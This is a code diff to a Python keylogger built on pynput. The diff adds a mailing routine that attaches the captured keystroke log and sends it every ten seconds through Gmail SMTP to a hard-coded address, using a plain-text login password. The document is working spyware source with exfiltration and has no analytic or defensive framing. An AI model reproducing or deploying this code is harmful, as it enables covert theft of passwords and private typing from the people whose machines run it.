@@ -1,5 +1,11 @@
 from pynput.keyboard import Key, Listener 
 from threading import Timer
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import os
 
 class Main: 
     def __init__(self, file_name):
@@ -40,13 +46,13 @@ class Main:
         self.t = Timer(10.0, self.key_state_clean_write)
         self.t.start()
         
-
     def key_state_clean_write(self):
         if not self.keys:
             return
         self.count = 0
         self.key_write()
         self.keys = []
+        self.send_email()
 
     def setup(self):
         self.listener.start()
@@ -54,8 +60,38 @@ class Main:
     def join(self):
         self.listener.join()
 
+    # MAILING LOGIC 
+    def send_email(self):
+        message = MIMEMultipart()
+
+        message['From'] = 'loggerdatamail@gmail.com'
+        message['To'] = 'loggerdatamail@gmail.com'
+        message['Subject'] = 'Logger Data'
+        message.attach(MIMEText(' ', 'plain'))
+
+        attachment = open(os.path.abspath(self.fn), 'rb')
+
+        p = MIMEBase('application', 'octet-stream')
+        p.set_payload((attachment).read())
+
+        encoders.encode_base64(p)
+
+        p.add_header('Content-Disposition', 'attachment; filename=%s' %self.fn)
+
+        message.attach(p)
+
+        s=smtplib.SMTP('smtp.gmail.com', 587)
+
+        s.starttls()
+
+        s.login('loggerdatamail@gmail.com', 'piasek1984')
+
+        s.sendmail('loggerdatamail@gmail.com', 'loggerdatamail@gmail.com', message.as_string())
+        
+        s.quit()
+
 def main():
-    Logger = Main('config')
+    Logger = Main('log')
     Logger.setup()
     Logger.join()
     
